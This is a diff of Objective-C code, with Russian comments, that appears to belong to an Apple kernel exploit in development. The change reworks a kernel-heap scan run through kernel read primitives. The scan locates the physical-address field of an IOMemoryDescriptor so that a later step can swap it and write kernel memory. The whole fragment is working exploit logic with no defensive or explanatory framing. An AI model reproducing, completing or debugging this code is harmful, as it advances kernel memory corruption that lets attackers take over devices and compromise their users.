@@ -5739,8 +5739,9 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
               proven ? @"ПОДТВЕРЖДЁН" : @"НЕ СОШЛОСЬ — стоп (записей не будет)"]);
     if (!backingPA || !proven) { free(ctl); return r; }
 
-    // 3. поле подмены: heap-скан (тип 0x21) на пару {backingPA, 0x4000} =
-    //    ranges[0] {pa, len} в IOMemoryDescriptor. Уникальная подпись.
+    // 3. поле подмены: heap-скан (тип 0x21) на голый qword backingPA (1.9.109:
+    //    длина в ranges[0] = 0x1000 (32*32*4 БАЙТА), а не 0x4000 — пара не
+    //    матчилась. PA по heap уникален, len-проверка не нужна).
     uint64_t tableVA = gFrameTableVA ? gFrameTableVA : [self frameTableVAWithLog:r];
     uint64_t totalPages = kconstant(physSize) >> 14;
     uint64_t hitVAs[8];
@@ -5754,20 +5755,18 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         if (!kva) continue;
         uint8_t buf[0x4000];
         if (!kpRead(kva, buf, sizeof(buf), "paSwap pair scan", r)) continue;
-        for (uint32_t o = 0; o + 16 <= sizeof(buf); o += 8) {
-            uint64_t q = 0, q2 = 0;
+        for (uint32_t o = 0; o + 8 <= sizeof(buf); o += 8) {
+            uint64_t q = 0;
             memcpy(&q, buf + o, 8);
             if (q != backingPA) continue;
-            memcpy(&q2, buf + o + 8, 8);
-            if (q2 != 0x4000) continue;
             hitVAs[hitN++] = kva + o;
-            kpNote(r, [NSString stringWithFormat:@"  ★ пара {backingPA,0x4000} @ %#llx — поле ranges[0].pa", (unsigned long long)(kva + o)]);
+            kpNote(r, [NSString stringWithFormat:@"  ★ qword backingPA @ %#llx (heap)", (unsigned long long)(kva + o)]);
             if (hitN >= 8) break;
         }
     }
-    kpNote(r, [NSString stringWithFormat:@"  полей с парой {backingPA,0x4000}: %d", hitN]);
+    kpNote(r, [NSString stringWithFormat:@"  qword'ов с backingPA в heap: %d", hitN]);
     if (!hitN) {
-        kpNote(r, @"  пара не найдена в heap — записей не будет");
+        kpNote(r, @"  backingPA не найден в heap — записей не будет");
         free(ctl);
         return r;
     }
